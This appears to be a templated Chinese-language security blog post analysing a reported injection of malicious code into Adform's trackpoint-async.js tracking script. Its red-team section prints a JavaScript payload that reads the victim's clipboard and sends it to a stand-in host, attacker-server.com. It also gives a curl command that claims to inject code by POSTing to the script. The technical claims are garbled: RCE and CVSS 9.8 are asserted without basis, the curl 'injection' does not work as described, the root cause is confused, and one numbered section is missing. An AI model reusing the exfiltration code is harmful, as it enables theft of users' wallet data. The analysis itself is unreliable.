# 🚨 解析 Adform 廣告科技公司遭駭客入侵事件：追蹤指令碼被植入惡意程式碼
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 和 Info Leak
> * **關鍵技術**: `JavaScript Injection`, `DOM-based XSS`, `Clipboard Hijacking`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Adform 的追蹤指令碼 `trackpoint-async.js` 沒有正確地驗證和過濾用戶輸入，導致駭客可以注入惡意 JavaScript 代碼。
* **攻擊流程圖解**: 
    1. 駭客注入惡意 JavaScript 代碼到 `trackpoint-async.js` 中。
    2. 用戶訪問包含 `trackpoint-async.js` 的網站。
    3. 惡意 JavaScript 代碼被執行，竊取用戶的加密貨幣資產。
* **受影響元件**: Adform 的 `trackpoint-async.js` 指令碼，版本號未知。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 駭客需要有能力注入惡意 JavaScript 代碼到 `trackpoint-async.js` 中。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 惡意 JavaScript 代碼範例
    function stealClipboard() {
        //竊取用戶剪貼簿中的加密貨幣錢包網址
        navigator.clipboard.readText().then(text => {
            //傳送竊取的資料到駭客的伺服器
            fetch('https://attacker-server.com/steal', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ clipboard: text })
            });
        });
    }
    
    ```
    *範例指令*: 使用 `curl` 命令發送惡意請求到 `trackpoint-async.js`。

```

bash
curl -X POST \
  https://example.com/trackpoint-async.js \
  -H 'Content-Type: application/javascript' \
  -d 'stealClipboard();'

```
* **繞過技術**: 駭客可以使用 `DOM-based XSS` 技術來繞過瀏覽器的安全機制。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **JavaScript Injection**: 惡意 JavaScript 代碼被注入到網頁中，竊取用戶資料或進行其他惡意行為。
* **DOM-based XSS**: 一種跨站腳本攻擊，利用網頁的 DOM 物件注入惡意 JavaScript 代碼。
* **Clipboard Hijacking**: 竊取用戶剪貼簿中的資料，例如加密貨幣錢包網址。
